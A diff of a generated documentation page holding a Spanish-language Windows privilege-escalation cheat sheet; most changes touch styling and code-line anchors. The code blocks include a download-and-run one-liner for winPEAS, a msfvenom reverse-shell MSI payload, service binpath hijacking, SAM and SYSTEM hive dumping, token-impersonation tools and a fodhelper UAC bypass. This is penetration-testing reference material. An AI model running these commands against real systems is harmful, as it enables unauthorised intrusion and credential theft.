@@ -46,8 +46,8 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
       
     
     
@@ -67,7 +67,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="grey">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -1112,47 +1112,47 @@
 <h1 id="windows-privilege-escalation">Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permanent link">&para;</a></h1>
 <h2 id="enumeracion-inicial">Enumeración Inicial<a class="headerlink" href="#enumeracion-inicial" title="Permanent link">&para;</a></h2>
 <h3 id="sistema">Sistema<a class="headerlink" href="#sistema" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Info del sistema</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">systeminfo</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">hostname</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c"># Usuarios y grupos</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">net</span> <span class="n">user</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Info del sistema</span>
+<span class="n">systeminfo</span>
+<span class="n">hostname</span>
+<span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+
+<span class="c"># Usuarios y grupos</span>
+<span class="n">net</span> <span class="n">user</span>
+<span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
 </code></pre></div>
 <h3 id="herramientas-automaticas">Herramientas Automáticas<a class="headerlink" href="#herramientas-automaticas" title="Permanent link">&para;</a></h3>
 <div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">WinPEAS</label><label for="__tabbed_1_2">PowerUp</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Descargar y ejecutar</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Descargar y ejecutar</span>
+<span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1&#39;</span><span class="p">)</span>
 </code></pre></div>
 </div>
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Invoke-AllChecks</span>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-AllChecks</span>
 </code></pre></div>
 </div>
 </div>
 </div>
 <h2 id="vectores-de-escalada">Vectores de Escalada<a class="headerlink" href="#vectores-de-escalada" title="Permanent link">&para;</a></h2>
 <h3 id="servicios">Servicios<a class="headerlink" href="#servicios" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Listar servicios</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">Get-Service</span>
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">sc </span><span class="n">query</span> <span class="n">state</span><span class="p">=</span> <span class="n">all</span>
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># Permisos de servicios</span>
-<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwcqv</span> <span class="s2">&quot;Users&quot;</span> <span class="p">*</span>
-<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
-<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c"># Modificar binario de servicio</span>
-<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nb">sc </span><span class="n">config</span> <span class="no">[service]</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&quot;C:\path\to\payload.exe&quot;</span>
-<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nb">sc </span><span class="n">stop</span> <span class="no">[service]</span>
-<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nb">sc start </span><span class="no">[service]</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Listar servicios</span>
+<span class="nb">Get-Service</span>
+<span class="nb">sc </span><span class="n">query</span> <span class="n">state</span><span class="p">=</span> <span class="n">all</span>
+
+<span class="c"># Permisos de servicios</span>
+<span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwcqv</span> <span class="s2">&quot;Users&quot;</span> <span class="p">*</span>
+
+<span class="c"># Modificar binario de servicio</span>
+<span class="nb">sc </span><span class="n">config</span> <span class="no">[service]</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&quot;C:\path\to\payload.exe&quot;</span>
+<span class="nb">sc </span><span class="n">stop</span> <span class="no">[service]</span>
+<span class="nb">sc start </span><span class="no">[service]</span>
 </code></pre></div>
 <h3 id="unquoted-service-path">Unquoted Service Path<a class="headerlink" href="#unquoted-service-path" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Buscar rutas sin comillas</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Buscar rutas sin comillas</span>
+<span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span>
 </code></pre></div>
 <div class="admonition example">
 <p class="admonition-title">Explotación</p>
@@ -1160,28 +1160,28 @@
 <p>Colocar payload en <code>C:\Program.exe</code> o <code>C:\Program Files\Service.exe</code></p>
 </div>
 <h3 id="alwaysinstallelevated">AlwaysInstallElevated<a class="headerlink" href="#alwaysinstallelevated" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Verificar</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c"># Explotar con msfvenom</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">IP</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Verificar</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+
+<span class="c"># Explotar con msfvenom</span>
+<span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">IP</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
+<span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
 </code></pre></div>
 <h3 id="credenciales-guardadas">Credenciales Guardadas<a class="headerlink" href="#credenciales-guardadas" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Credenciales en registro</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c"># Archivos de configuración</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">ini</span> <span class="p">*.</span><span class="n">config</span>
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c"># SAM y SYSTEM (si son accesibles)</span>
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="n">save</span>
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="n">save</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Credenciales en registro</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>
+
+<span class="c"># Archivos de configuración</span>
+<span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">ini</span> <span class="p">*.</span><span class="n">config</span>
+
+<span class="c"># SAM y SYSTEM (si son accesibles)</span>
+<span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="n">save</span>
+<span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="n">save</span>
 </code></pre></div>
 <h3 id="token-impersonation">Token Impersonation<a class="headerlink" href="#token-impersonation" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Verificar privilegios</span>
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Verificar privilegios</span>
+<span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
 </code></pre></div>
 <div class="admonition warning">
 <p class="admonition-title">Privilegios explotables</p>
@@ -1195,35 +1195,35 @@
 <div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">PrintSpoofer</label><label for="__tabbed_2_2">GodPotato</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">cmd</span>
+<div class="highlight"><pre><span></span><code><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">cmd</span>
 </code></pre></div>
 </div>
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
 </code></pre></div>
 </div>
 </div>
 </div>
 <h3 id="scheduled-tasks">Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Listar tareas</span>
-<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
-<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
-<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># Buscar scripts modificables</span>
-<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">script</span><span class="p">.</span><span class="n">bat</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Listar tareas</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
+
+<span class="c"># Buscar scripts modificables</span>
+<span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">script</span><span class="p">.</span><span class="n">bat</span>
 </code></pre></div>
 <h2 id="tecnicas-adicionales">Técnicas Adicionales<a class="headerlink" href="#tecnicas-adicionales" title="Permanent link">&para;</a></h2>
 <h3 id="dll-hijacking">DLL Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># Buscar DLLs faltantes con Process Monitor</span>
-<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c"># Filtrar por &quot;NAME NOT FOUND&quot; y &quot;.dll&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Buscar DLLs faltantes con Process Monitor</span>
+<span class="c"># Filtrar por &quot;NAME NOT FOUND&quot; y &quot;.dll&quot;</span>
 </code></pre></div>
 <h3 id="uac-bypass">UAC Bypass<a class="headerlink" href="#uac-bypass" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Verificar nivel de UAC</span>
-<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span>
-<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
-<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c"># fodhelper bypass</span>
-<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">/</span><span class="n">f</span>
-<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">v</span> <span class="n">DelegateExecute</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">f</span>
-<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">fodhelper</span><span class="p">.</span><span class="n">exe</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Verificar nivel de UAC</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span>
+
+<span class="c"># fodhelper bypass</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">/</span><span class="n">f</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">v</span> <span class="n">DelegateExecute</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">f</span>
+<span class="n">fodhelper</span><span class="p">.</span><span class="n">exe</span>
 </code></pre></div>
 
 
@@ -1274,7 +1274,7 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
